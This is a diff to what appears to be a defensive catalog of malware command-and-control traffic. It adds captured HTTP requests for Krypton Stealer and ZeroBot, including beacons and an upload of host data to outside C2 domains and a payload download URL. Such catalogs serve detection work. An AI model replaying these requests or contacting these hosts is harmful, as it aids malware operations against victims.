@@ -800,6 +800,20 @@ jg==
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krugbot.png "Krugbot")
 
+#### Krypton Stealer
+~~~
+POST /connect_meta.php HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Client
+Host: orl05511cn.temp.swtest.ru
+Content-Length: 26
+Cache-Control: no-cache
+
+id=01&message=test_message
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krypton.png "KryptonStealer")
+
 #### Loda
 I've never seen this without the beta flah
 ~~~
@@ -1881,6 +1895,45 @@ Server: cloudflare
 CF-RAY: 52931bc13d868eb3-DME
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vmzeus.png "VMZeus")
+
+#### ZeroBot
+~~~
+GET //uploads/b/m/modules.zip HTTP/1.1
+Host: darkrat.lh1.in
+Connection: Keep-Alive
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zerobot1.png "zerobot1")
+
+~~~
+POST /api/zrcdr77/ HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------------8d75c50cdcd2da3
+Host: darkrat.lh1.in
+Content-Length: 900
+Expect: 100-continue
+Connection: Keep-Alive
+
+
+-----------------------------8d75c50cdcd2da3
+Content-Disposition: form-data; name="pc"
+
+TEST-PC
+-----------------------------8d75c50cdcd2da3
+Content-Disposition: form-data; name="type"
+
+err
+-----------------------------8d75c50cdcd2da3
+Content-Disposition: form-data; name="file"; filename="err.txt"
+Content-Type: text/html
+
+ICSharpCode.SharpZipLib.Zip.ZipException: Cannot find central directory
+   at ICSharpCode.SharpZipLib.Zip.ZipFile.ReadEntries()
+   at ICSharpCode.SharpZipLib.Zip.ZipFile..ctor(Stream stream)
+   at ICSharpCode.SharpZipLib.Zip.FastZip.ExtractZip(Stream inputStream, String targetDirectory, Overwrite overwrite, ConfirmOverwriteDelegate confirmDelegate, String fileFilter, String directoryFilter, Boolean restoreDateTime, Boolean isStreamOwner, Boolean allowParentTraversal)
+   at Unpacker.Program.Unpack()
+
+-----------------------------8d75c50cdcd2da3--
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zerobot2.png "zerobot2")
 
 ### Unknowns
 #################################################################################################
